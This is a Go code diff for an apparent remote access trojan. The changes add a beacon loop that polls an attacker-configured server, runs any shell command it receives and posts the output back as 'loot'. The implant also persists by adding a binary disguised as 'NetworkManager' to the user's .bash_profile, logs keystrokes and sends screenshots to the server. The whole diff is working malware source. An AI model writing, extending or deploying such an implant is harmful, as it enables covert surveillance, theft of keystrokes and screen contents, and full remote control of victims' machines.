@@ -5,7 +5,9 @@ import (
 	"fmt"
 	"io"
 	"log/slog"
+	"math/rand/v2"
 	"net/http"
+	"os"
 	"os/exec"
 	"strings"
 	"time"
@@ -13,18 +15,64 @@ import (
 	"github.com/hardal7/pex/internal/config"
 )
 
+func Serve() {
+	ch := make(chan string)
+	for {
+		makeRequest(ch)
+		time.Sleep(time.Duration(config.Interval+(config.Jitter*rand.IntN(1))) * time.Second)
+	}
+}
+
+type Loot struct {
+	kind    string
+	content string
+}
+
 var username string
 var isLoggingKeys bool
+
+func makeRequest(ch chan string) {
+	requestURL := "http://" + config.Host + ":" + config.Port
+	request, _ := http.NewRequest("GET", requestURL, nil)
+	username := getUsername()
+	request.Header.Set("Username", username)
+	go readKeys(*request, ch)
+
+	response, err := http.DefaultClient.Do(request)
+	if err != nil {
+		slog.Info("Failed to send request to server: " + err.Error())
+		return
+	} else {
+		slog.Info("Sent request to server")
+	}
+
+	body, _ := io.ReadAll(response.Body)
+	command := strings.Fields(string(body[:]))
+	loot := runCommand(command, ch)
+
+	slog.Info("Sending loot to server")
+	if loot.kind == "Image" {
+		buffer, _ := os.ReadFile(loot.content)
+		_, err = http.Post(requestURL, "image/png", bytes.NewBuffer(buffer))
+	} else {
+		_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(loot.content)))
+	}
+	if err != nil {
+		slog.Info("Failed sending loot to server: " + err.Error())
+	} else {
+		slog.Info("Sent loot to server")
+	}
+}
 
 func getUsername() string {
 	if username == "" {
 		slog.Info("Getting username")
-		username, _ = executeCommand([]string{"whoami"})
+		username = executeCommand([]string{"whoami"})
 	}
 	return strings.TrimSpace(username)
 }
 
-func executeCommand(command []string) (string, string) {
+func executeCommand(command []string) string {
 	var stdout bytes.Buffer
 	var stderr bytes.Buffer
 
@@ -53,21 +101,28 @@ func executeCommand(command []string) (string, string) {
 		slog.Info("Error Output: " + stderr.String())
 	}
 
-	return stdout.String(), stderr.String()
+	return stdout.String() + stderr.String()
 }
 
-func queryCommand(command []string, ch chan string) []string {
+func runCommand(command []string, ch chan string) Loot {
+	var loot Loot
 	switch command[0] {
 	case "INJECT":
-		command =
-			[]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"}
+		loot.content = executeCommand([]string{"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"})
 	case "LOGKEYS":
-		command = []string{}
 		isLoggingKeys = true
 		go LogKeyboard(ch)
+	case "SCREEN":
+		screenshots := CaptureScreen()
+		loot.kind = "Image"
+		// TODO: Send more than 1 screenshot for multiple monitor setups
+		loot.content = screenshots[0]
+	default:
+		slog.Info("Executing command: " + command[0])
+		loot.content = executeCommand(command)
 	}
 
-	return command
+	return loot
 }
 
 func readKeys(request http.Request, ch chan string) {
@@ -78,47 +133,5 @@ func readKeys(request http.Request, ch chan string) {
 			keys = ""
 			http.DefaultClient.Do(&request)
 		}
-	}
-}
-
-func makeRequest(ch chan string) {
-	requestURL := "http://" + config.Host + ":" + config.Port
-	request, _ := http.NewRequest("GET", requestURL, nil)
-	username := getUsername()
-	request.Header.Set("Username", username)
-	go readKeys(*request, ch)
-
-	response, err := http.DefaultClient.Do(request)
-	if err != nil {
-		slog.Info("Failed to send request to server: " + err.Error())
-		return
-	} else {
-		slog.Info("Sent request to server")
-	}
-
-	body, _ := io.ReadAll(response.Body)
-	command := strings.Fields(string(body[:]))
-	command = queryCommand(command, ch)
-
-	var out, errout string
-	if string(body) != "" {
-		slog.Info("Executing command: " + string(body))
-		out, errout = executeCommand(command)
-	}
-
-	slog.Info("Sending loot to server")
-	_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(out+errout)))
-	if err != nil {
-		slog.Info("Failed sending loot to server: " + err.Error())
-	} else {
-		slog.Info("Sent loot to server")
-	}
-}
-
-func Serve() {
-	ch := make(chan string)
-	for {
-		makeRequest(ch)
-		time.Sleep(time.Duration(config.Interval) * time.Second)
 	}
 }
